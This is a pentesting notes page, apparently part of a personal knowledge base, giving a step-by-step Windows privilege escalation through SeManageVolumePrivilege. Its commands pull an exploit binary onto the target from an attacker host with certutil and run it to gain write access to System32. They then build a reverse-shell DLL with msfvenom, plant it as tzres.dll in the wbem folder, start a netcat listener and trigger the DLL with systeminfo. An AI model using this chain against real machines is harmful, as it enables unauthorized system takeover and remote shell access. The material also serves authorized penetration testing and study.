---
title: SeManageVolumePrivilege
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - pentesting
  - windows
  - privilege
  - SeManageVolumePrivilege
---
# SeManageVolumePrivilege


Original repo at https://github.com/xct/SeManageVolumeAbuse

Forked to: https://github.com/amandaguglieri/SeManageVolumeAbuse.git


Source for explotation: https://hackfa.st/Offensive-Security/Windows-Environment/Privilege-Escalation/Token-Impersonation/SeManageVolumePrivilege/#exploit-with-wertrigger


### **Step 1: Check current user privileges**

1. Verify if the current user has `SeManageVolumePrivilege`:  

```bash
whoami /priv
```

### **Step 2: Enable SeManageVolumePrivilege (optional)**

1. Download the `EnableAllTokenPrivs.ps1` script:  

```
wget https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1
```
        
2. Transfer the script to the target machine:  
```
certutil -urlcache -f http://[IP-ADDRESS]:80/EnableAllTokenPrivs.ps1 EnableAllTokenPrivs.ps1
```

3. Import the module to enable the privilege

```
Import-Module .\EnableAllTokenPrivs.ps1`
```
    
4. Verify privileges again to confirm that `SeManageVolumePrivilege` is enabled:  
```
whoami /priv
```


### **Step 3:  DLL hijacking with Metasploit**

1. Download and transfer `SeManageVolumeExploit.exe` to the target:  

```
wget https://github.com/amandaguglieri/SeManageVolumeAbuse/releases/download/1.0/SeManageVolumeAbuse.exe
```

2. Transfer it using `certutil`:  

```
certutil -urlcache -f http://[IP-ADDRESS]:80/SeManageVolumeExploit.exe SeManageVolumeExploit.exe
```

3. Execute the exploit to gain write privileges to `C:\Windows\System32\`:

```
.\SeManageVolumeExploit.exe
```

4. Create a malicious DLL payload with `msfvenom`:  

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=[IP-ADDRESS] LPORT=1337 -f dll -o tzres.dll
```

5. Place the malicious DLL in the WBEM directory:  

```
copy tzres.dll C:\Windows\System32\wbem\
```

6. Set up a Netcat listener on the attacking machine:

```
rlwrap -cAr nc -lnvp 1337`
```    

7. Activate the payload by running:

```
systeminfo
```




